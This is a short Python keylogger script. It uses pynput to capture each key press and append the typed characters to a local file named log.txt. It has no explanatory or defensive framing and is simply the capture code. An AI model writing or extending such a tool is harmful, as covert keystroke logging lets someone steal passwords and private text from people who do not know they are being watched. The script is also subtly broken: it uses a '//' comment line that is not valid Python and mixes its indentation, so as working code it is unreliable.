import pynput.keyboard as keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
    	// todo error handler
        return 0

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
